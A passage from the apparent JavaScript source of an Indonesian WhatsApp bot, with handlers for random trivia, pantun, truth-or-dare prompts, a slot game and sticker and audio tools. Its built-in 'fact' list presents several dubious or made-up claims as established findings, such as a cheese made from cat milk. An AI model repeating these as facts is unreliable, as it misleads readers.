\"Mus\" yang berarti \"pencuri\".","Tidur Siang (Power Nap) trbukti menambah tinggi badan, dikrnkan saat kita tidur siang hormon pertumbuhan (Growth Hormone) lbh aktif bekerja.","Bilangan prima terbesar di dunia saat ini panjangnya 17 juta digit angka, cukup banyak untuk mengisi 28 lembar halaman pada buku novel.","Menurut sebuah studi, minum teh hijau setelah makan ikan membantu menghalangi zat Mercury yang terkandung dalam ikan memasuki aliran darah."," Memperpanjang usia handphone hingga 4 tahun dapat mengurangi dampak lingkungan sampai 40 persen. [Hasil studi di Swiss]","Duduk bersama dgn teman-teman / keluarga utk makan bersama, dpt meningkatkan kebahagiaan & membantu meringankan depresi. [ehealthnewsdaily]","Abibliophobia adalah fobia atau ketakutan terhadap kehabisan bahan bacaan.","Pada abad pertengahan di Eropa, garam sangat mahal harganya, sehingga disebut sebagai \"emas putih\".","Mengunyah permen karet dapat meningkatkan kemampuan berpikir cepat dan kewaspadaan hingga 10 persen. [Jurnal Brain and Cognition]","Wanita yang sedang stres selama kehamilannya cenderung melahirkan anak-anak yang pemarah. [Institute of Psychiatry, King College London]","","35. Disarankan supaya membeli sepatu pada sore hari. Sebab, setelah seharian berjalan, di sore hari kaki akan membesar 5-8 persen.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. [cracked .com]","Menurut penelitian baru, usia harapan hidup anak band rata-rata lebih tinggi dibandingkan musisi yang memilih solo karir. (detikHealth)","Pulau Dewata Bali merupakan 1 dari 10 pulau paling romantis di dunia. [majalah Travel+Leisure]","Universitas di Jepang selalu melakukan upacara peringatan bagi hewan (contoh: tikus) yang mati dalam pengujian laboratorium. [web.archive .org]","Berkedip memberikan otak Anda istirahat sebentar. [para ilmuan di Japan’s Osaka University]","Wanita yang bahagia dalam sebuah pernikahan akan mengalami berat badan naik setengah pound (0,22 kg) setiap 6 bulan. [DailyMail]","Rasa cemburu berlebihan bisa digolongkan penyakit jiwa, krna dpt mendorong ssorg utk bunuh diri / menghabisi nyawa org lain. [riset]","","Mengkonsumsi buah tomat beberapa kali dlm kurun waktu seminggu dpt mengatasi perasaan depresi. [peneliti di Tianjin Medical Univ., Cina]"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. [BBCnews]","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Memeluk orang yg disayangi dpt membantu menurunkan tekanan darah, mengurangi stres dan","kecemasan, bahkn dpt meningkatkan memori. [Dailymail]","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".Berjalan kaki atau bersepeda ke sekolah mempertajam konsentrasi siswa di kelas dan tetap bertahan sekitar 4 jam kemudian. [Medical Daily]","Menurut riset pasar global Euromonitor International, pria Korea adalah pria yang paling suka bersolek dari pria lain di dunia.","Rata-rata orang akan merasa 100 persen sehat / fit hanya 61 hari dalam setahun. (Penelitian di Inggris)","Polydactyl Cat adalah jenis kucing yang memiliki jempol di kaki mereka.","Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]","Di Jerman, tahanan yg ingin meloloskan diri dr penjara adl bukan mrupakn perbuatan ilegal. Krn itu salah1 naluri dasar manusia untuk kebebasan.","Wanita merasa diri mereka terlihat paling jelek dan terlihat lebih tua pada hari Rabu pukul 15.30 . [studi baru dari St Tropez]Orang yang rutin bermain video game ternyata memiliki penalaran yang baik dibanding kebanyakan orang. (detikHealth)","Nama \"Gorila\" berasal dari kata Yunani \"Gorillai\" yang berarti \"perempuan berbulu\".","IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.","Selama abad ke-13, kata \"nice\" sebenarnya berarti “stupid”, \"senseless\" dan “foolish\".","59. 49% dari pemilik Smartphone adalah jomblo. (Survei, \"2012 Online User Behavior and Engagement Study\")","Fakta Unik","60. Gazzarella adalah keju mozzarella yang terbuat dari susu kucing. 61. Rata-rata orang melihat / mengecek ponselnya sekitar 150 kali sehari. (Laporan Nokia pada MindTrek 2010)","Lalat dapat menyalurkan sekitar 300 bakteri setiap kali hinggap di benda.","Tertawa dapat meningkatkan aktivitas antibodi sekitar 20%, juga membantu untuk menghancurkan virus dan sel-sel tumor.","Fobia matematika (mathematics anxiety) memicu respon yang sama di otak sbg rasa sakit fisik. Gejalanya yaitu melihat angka saja sudah nyeri."," Karakter kartun Bugs Bunny diberi pangkat kehormatan sersan-mayor di Korps Marinir AS pada akhir Perang Dunia II. (wikipedia)","Apel yang ditaruh di ruang terbuka akan matang 10 kali lebih cepat dibandingkan dengan apel yang ditaruh di kulkas.","Ungkapan 'Smitten' adalah untuk menyebut 'naksir' dalam bahasa Inggris.","Menurut etiket internasional, sebuah jabat tangan yang tepat dan baik harus berlangsung selama sekitar 3 detik & dilepaskan setelah goyang.","Ketika kita sedang jatuh cinta, otak akan memproduksi dopamin ekstra, bahan kimia yang membuat seseorang menjadi gembira berlebihan."," \"Mwahahaha\" dan \"lolz\" telah ditambahkan ke Kamus Inggris Oxford.","Menurut penelitian, pria cenderung menurunkan volume suaranya ketika ia berbicara dg seseorang yg ia cintai, sementara perempuan sebaliknya.","Di Perancis, jajanan Arum Manis (Rambut Nenek) disebut \"Barbe á Papa\" yang berarti \"Jenggot Ayah\".","Menurut penelitian, PR terlalu banyak sebenarnya dapat menyebabkan siswa menjadi stres, depresi & mendapat nilai lebih rendah.","Hangry adalah penggabungan kata dari \"Hungry\" dan \"Angry\", di pakai ketika anda sedang lapar dan marah.","Kentut dari bakteri membuat keju swiss memiliki lubang-lubang.","Mendengarkan musik benar-benar dapat mengurangi rasa sakit kronis hingga 20% dan membantu meringankan depresi hingga 25%. (sciencedaily)","Orang yang merasa kesepian memiliki kemungkinan mengalami kepikunan 70-80% lebih tinggi. (Journal of Neurosurgery Neurologi and Psychiatry)","Melamun dpt memendekkan telomere (bagian paling ujung sel DNA) yang berperan dlm menjaga kestabilan sel, dimana dapat mempercepat proses penuaan."]
									const ran_faktau = faktau[Math.floor(Math.random() * faktau.length)]
									sendButMessage(from, `${ran_faktau}`, `${ucapannya}`, [
									{
										buttonId: `faktaunik`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
											limitAdd(sender, limit)
									}
									break
						case 'pantun':{
									const pantun = ["\nAnak tikus rindu ibunya\n\nsombong nich ceritanya","\nAda kepompong ada kupu\n\nbales donk sms dari aku","\nBeli bandeng\n\ndi Malaysia\n\ngue ganteng\n\nkayak Pasha","\nHati siapa tak bimbang\n\nsitu botak minta dikepang","\nBuah semangka\n\nbuah duren\n\nnggak nyangka\n\ngue keren\n ","\n Mawar bersemi\n\ndi batang kayu\n\ndo you love me\n\nlike i love you","\nBurung perkutut\n\nburung kuthilang\n\nkamu kentut\n\nenggak bilang bilang","\nBread is roti\n\nshadow is bayang\n\nbefore you mati\n\nbetter you sembahyang","\nJangan takut\n\njangan khawatir\n\nitu kentut\n\nbukan petir","\nBeli ikan di pasar malam\n\ndasar bego ni kawan","\nMakan duren sambil ngelamun,\n\nHati-hati ketelen ntar bijinya","\nDi  sana gunung, di sini gunung\n\nCiptaan Tuhan deh","\nKan bandeng\n\nmakan kawat\n\norang ganteng\n\nnumpang lewat","\nOrang ganteng\n\nsuka sama si Rini\n\ngak seneng\n\nmaju sini","\nMelon manis di air es\n\nke mana aja lo gak pernah sms","\nJambu merah\n\ndi dinding\n\njangan marah\n\njust kidding","\nBuah semangka\n\nbuah manggis\n\nnggak nyangka\n\ngue manis","\nMen sana\n\nin corpore sano\n\ngue maen ke sana,\n\nelo maen ke sono!","\nBuah apel\n\ndi air payau\n\nnggak level\n\nlayauuuuuuu","\nDi sini bingung, di sana linglung\n\nemangnya enak, enggak nyambung…","\nBuah semangka berdaun sirih\n\nBuah ajaib kali yah","\nPilih suara harpa yang jelas.\n\nTali di harpa diikat cinta","\nCiuman di pipi\n\nciuman di dahi\n\nApa yang dicium sesudah lah cinta?","\nSepandai-pandai tupai melompat\n\nPolisi lebih pandai melompat","\nDua tiga kacang tanah\n\nenggak ada pacar yang datang ke rumah","\nDapet kado isinya tomat\n\nBodo amat!!","\nDulu delman, sekarang gokar\n\ndulu teman, sekarang pacar","\nStroberi mangga apel\n\nsorry gak level","\nBola pingpong dimakan gelatik\n\nBiar ompong yang penting cantik\n","\nMata belo,\n\nala komedian.\n\ngue sama elo?\n\nmaunya jadian.","\nTunda lapar,\n\nmakan indomi.\n\nhati menggelepar,\n\ncintapun bersemi.","\nPotong kuku,\n\npendek-pendek.\n\nhatiku beku,\n\nsi abang mendadak ngondek.","\nBeli ketan,\n\nbeli kain songket.\n\nbiar udah mantan,\n\nkita tetep lengket.","\nKe pasar, nyari obat gatal\n\nDasar, gak modal!","\nMakan semangka,\n\nmakan kedondong.\n\nkalau suka,\n\nnyatain dong.","\nGa punya pendirian,\n\nbikin jemu.\n\nga mau sendirian,\n\nmaunya bobo sama kamu.","\nNembak itik,\n\nlangsung kena.\n\nkamu cantik,\n\nhey nona!","\nKotak amal,\n\ndigoyang-goyang.\n\nkemarin aku diramal,\n\njodohnya sama abang.","\nHari Jumat,\n\npada pake batik.\n\nsalam hormat,\n\nbuat neng cantik.","\nPecahan genting,\n\ndi bawah kursi.\n\nbetah meeting,\n\nkarena si boss seksi.","\nNangis-nangis,\n\nmobil kena srempet.\n\nneng manis,\n\nmau dong dipepet.","\nPanasin mentega,\n\nkarena mulai beku.\n\nkamu mau ga,\n\njadi imamku?","\nPotong sebahu,\n\nbiar ga sendu.\n\nkamu tahu?\n\nAku rindu.","\nJangan tanya,\n\nkapan lulus kuliah.\n\nga dapet anaknya,\n\nmamanya boleh lah","\nBikin anak,\n\ndi pojokan sekolah\n\nkalau mau enak,\n\nnikah dulu lah.","\nMain mata,\n\nmesem-mesem.\n\nneng tetep cinta,\n\nbiarpun abang keteknya asem.","\nTiduran di tandu,\n\nberjam-jam.\n\nhati merindu,\n\nmata sulit memejam.","\nUbek-ubek peti,\n\ncari gunting.\n\nsaking cinta mati,\n\nneng rela bunting.","\nNamanya penjahat,\n\npolisi jadi inceran.\n\nbosan jadi temen curhat,\n\nmaunya pacaran.","\nKe salon creambath,\n\nbiar aliran darah lancar.\n\nbosen ah jadi sahabat,\n\nmaunya jadi pacar!"]
									const ran_pantun = pantun[Math.floor(Math.random() * pantun.length)]
									sendButMessage(from, `${ran_pantun}`, `${ucapannya}`, [
									{
										buttonId: `pantun`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
											limitAdd(sender, limit)
									}
									limitAdd(sender, limit)
									break
						case 'dare':
									const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
									const der = dare[Math.floor(Math.random() * dare.length)]
									sendButMessage(from, `${der}`, `${ucapannya}`, [
									{
										buttonId: `dare`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
											limitAdd(sender, limit)
									break
						case 'truth':
									const trut = ['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
									const ttrth = trut[Math.floor(Math.random() * trut.length)]
									sendButMessage(from, `${ttrth}`, `${ucapannya}`, [
									{
										buttonId: `truth`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
											limitAdd(sender, limit)
									break
						case 'slot':
									const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🍐 : 🍊','🍐 : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇 ','🍌 : 🍒 : 🔔','🍐 : 🔔 :  🔔','🍊 : 🍋 :  🍒','🍋 : 🍋 :  🍌','?? : 🔔 : 🍇','🔔 : 🍐 :  🍇','🔔 : 🔔 :  🔔','🍒 : 🍒 :  🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
									somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
									somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
									somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
									rn = randomNomor(100)
									if (somtoyy== '🍌 : 🍌 : 🍌') {
										bp = await sendButMessage(from, `─「 🎰 *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
									{
										buttonId: `slot`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
										addBalance(sender, rn, balance)
										} else if (somtoyy == '🍒 : 🍒 : 🍒') {
									bp = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
									{
										buttonId: `slot`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
									addBalance(sender, rn, balance)
										} else if (somtoyy == '🔔 : 🔔 : 🔔') {
											bp = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
											addBalance(sender, rn, balance)
												} else if (somtoyy == '🍐 : 🍐 : 🍐') {
													bp = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
													addBalance(sender, rn, balance)
														} else if (somtoyy == '🍇 : 🍇 : 🍇') {
															bp = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
															addBalance(sender, rn, balance)
																} else {
																	ok = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲  *YOU LOSE*  ❳──\nXP BERKURANG 1000`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
																	addLevelingXp(sender, -1000)
																	}
																	limitAdd(sender, limit)
															break
						case 'ttp':  
                    if (args.length < 1) return reply('Text nya?')
                    ttp = args.join(' ')
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${ttp}`)
                    Zeeone.sendMessage(from, anu1, image, {quoted: Ofc, caption : '.stiker'})
					.catch(e =>{
					reply('Server eror')})
					 break   
         case 'attp':  
                    if (args.length < 1) return reply('Text nya?')
                    hhhh = q
                    anu1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${hhhh}`)
                    Zeeone.sendMessage(from, anu1, sticker, {quoted: Ofc})
					.catch(e =>{
					reply('Server eror')})
                    break
case 'brainly':
		if (args.length < 1) return reply('Pertanyaan apa')
		          	var brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
				Zeeone.sendMessage(from, teks, text,{quoted:Ofc,detectLinks: false})                        
		            }).catch(e => {
					reply('Terjadi kesalahan, coba beberapa saat lagi')
					})             
					break          
						case 'memegenerator': case 'memegen':
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
									if (!q.includes('|')) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
									try {
										if (!isQuotedImage) return reply(`Reply Gambar!`)
										reply(mess.wait)
										var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
										var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
										var enmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										var media = await Zeeone.downloadMediaMessage(enmedia)
										var njay = await uploadImages(media)
										var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks1}/${teks2}.png?background=${njay}`)
										Zeeone.sendMessage(from, resu, image, {caption:'.stiker', quoted: Ofc})
										fs.unlinkSync(media)
										} catch (e) {
											console.log(e)
										}
										limitAdd(sender, limit)
									break
					 	case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':
						if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* lord`)
									try {
										if (!isQuotedImage) return reply(`Reply Gambar!`)
										reply(mess.wait)
										var teks2 = args.join(' ')
										var enmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										var media = await Zeeone.downloadMediaMessage(enmedia)
										var njay = await uploadImages(media)
										var resu = await getBuffer(`https://api.memegen.link/images/custom/-/${teks2}.png?background=${njay}`)
										Zeeone.sendMessage(from, resu, image, {caption:'.stiker', quoted: Ofc})
										fs.unlinkSync(media)
										} catch (e) {
											console.log(e)
										}
										limitAdd(sender, limit)
									break
						case 'emoji':case 'semoji':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!q) return reply(`Example : ${prefix + command} 😂`)
									hex2 = args.join(' ') 
									emoji.get(`${hex2}`).then(emoji => {
										teks = `${emoji.images[4].url}`
										sendStickerFromUrl(from,`${teks}`)
									})
									limitAdd(sender, limit)
									break
						case 'stickerwm': case 'swm': case 'take': case 'takesticker': case 'takestick':{
									if (!Ofc.key.fromMe && !isPremium) return reply(mess.only.prem)
									reply(mess.wait) 
									let packname1 = q.split('|')[0] ? q.split('|')[0] : q
									let author1 = q.split('|')[1] ? q.split('|')[1] : ''
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
										exif.create(packname1, author1, `stickwm_${sender}`)
										await ffmpeg(`${media}`)
										.input(media)
										.on('start', function (cmd) {
											console.log(color(`STARTED : ${cmd}`,'yellow'))
											})
											.on('error', function (err) {
												console.log(color(`ERROR : ${err}`,'red'))
												fs.unlinkSync(media)
												reply(mess.error)
												})
												.on('end', function () {
													console.log(color(`FINISH`,'magenta'))
													exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
														if (error) return reply(mess.error)
														Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
														fs.unlinkSync(media)
														fs.unlinkSync(`./sticker/${sender}.webp`)
														fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
														})
														})
														.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
														.toFormat('webp')
														.save(`./sticker/${sender}.webp`)
														} else if (( isQuotedVideo && Ofc.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
															let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
															let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
															exif.create(packname1, author1, `stickwm_${sender}`)
															reply(mess.wait)
															await ffmpeg(`${media}`)
															.inputFormat(media.split('.')[4])
															.on('start', function (cmd) {
																console.log(color(`STARTED : ${cmd}`,'yellow'))
																})
																.on('error', function (err) {
																	console.log(color(`ERROR : ${err}`,'red'))
																	fs.unlinkSync(media)
																	let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
																	reply(mess.error)
																	})
																	.on('end', function () {
																		console.log((`FINISH`,'magenta'))
																		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
																			if (error) return reply(mess.error)
																			Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
																			fs.unlinkSync(media)
																			fs.unlinkSync(`./sticker/${sender}.webp`)
																			fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
																			})
																			})
																			.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
																			.toFormat('webp')
																			.save(`./sticker/${sender}.webp`)
																			} else if (isQuotedSticker) {
																				let encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
																				let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
																				exif.create(packname1, author1, `takestick_${sender}`)
																				exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
																				if (error) return reply(mess.error)
																				Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
																				fs.unlinkSync(media)
																				fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
																				})
																				} else {
																					reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
																				 }
																			}
																	 break
						case 'sticker': case 'stiker':  case 'stickergif': case 'stikergif': case 'sgif': case 's':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if ( isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
										await ffmpeg(`${media}`)
										.input(media)
										.on('start', function (cmd) {
											console.log(color(`STARTED : ${cmd}`))
											})
											.on('error', function (err) {
												console.log(color(`ERROR : ${err}`))
												fs.unlinkSync(media)
												reply(mess.error)
												})
												.on('end', function () {
													console.log(color(`FINISH`,'magenta'))
													Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
														limitAdd(sender, limit)
														fs.unlinkSync(media)
														fs.unlinkSync(`./sticker/${sender}.webp`)
														})
														.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
														.toFormat('webp')
														.save(`./sticker/${sender}.webp`)
														} else if ((isMedia && Ofc.message.videoMessage.seconds < 11 || isQuotedVideo && Ofc.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
															let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
															let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
															reply(mess.wait)
															await ffmpeg(`${media}`)
															.inputFormat(media.split('.')[4])
															.on('start', function (cmd) {
																console.log(color(`STARTED : ${cmd}`))
																})
																.on('error', function (err) {
																	console.log(color(`ERROR : ${err}`))
																	fs.unlinkSync(media)
																	let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
																	reply(mess.error)
																	})
																	.on('end', function () {
																		console.log(color(`FINISH`,'magenta'))
																		Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
																			limitAdd(sender, limit)
																			fs.unlinkSync(media)
																			fs.unlinkSync(`./sticker/${sender}.webp`)
																			})
																			.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
																			.toFormat('webp')
																			.save(`./sticker/${sender}.webp`)
																			} else {
																				reply(`Tag gambar yang sudah dikirim dengan caption .stiker`)
																				}
																				limitAdd(sender, limit)
												break
						case 'owner':{
							const ownerContact = [owner_number, "", "", "", "", "", "", "", "", "", ""]
							let ini_list = []
							for (let i of ownerContact.map(v => v + '@s.whatsapp.net')) {
								const vname = Zeeone.contacts[i] != undefined ? Zeeone.contacts[i].vname || Zeeone.contacts[i].notify : undefined
								ini_list.push({
									"displayName": `${owner_name}`,
									"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
									})
									}
									hehe = await Zeeone.sendMessage(from, {
										"displayName": `${ini_list.length} kontak`,
										"contacts": ini_list 
										}, 'contactsArrayMessage', { quoted: Ofc })
										Zeeone.sendMessage(from, `Nih Kak Contact Owner Ku ✨`, text, {quoted: hehe})
										}
										break
						case 'lirik':
									if (args.length < 1) return reply('Judulnya?')
									reply(mess.wait)
									teks = body.slice(7)
									lirikLagu(teks).then((res) => {
										let lirik = `*Hasil Pencarian Dari : ${q}*
										\n${res[0].result}`
										reply(lirik)
									})
									break
						case 'bass': 
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
										break
						case 'slowmo': case 'slow':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
